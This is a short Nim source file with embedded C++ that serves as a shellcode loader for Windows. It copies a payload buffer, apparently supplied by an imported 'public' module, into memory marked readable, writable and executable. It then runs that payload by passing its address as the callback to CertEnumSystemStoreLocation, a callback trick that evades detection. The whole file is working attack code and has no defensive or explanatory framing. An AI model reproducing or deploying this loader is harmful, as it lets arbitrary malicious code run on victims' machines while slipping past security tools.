{.passL:"-l Crypt32".}
import public

{.emit: """
#include <wincrypt.h>
int CertEnumSystemLocationNim(char *shellcode,SIZE_T shellcodeSize) {
    LPVOID addr = ::VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    ::RtlMoveMemory(addr, shellcode, shellcodeSize);
    ::CertEnumSystemStoreLocation(NULL, nullptr, (PFN_CERT_ENUM_SYSTEM_STORE_LOCATION)addr);
}
""".}

proc CertEnumSystemLocationNim(plainBuffer:cstring,size:cint):cint {.importcpp:"CertEnumSystemLocationNim(@)",nodecl.}

discard CertEnumSystemLocationNim(code,codelen)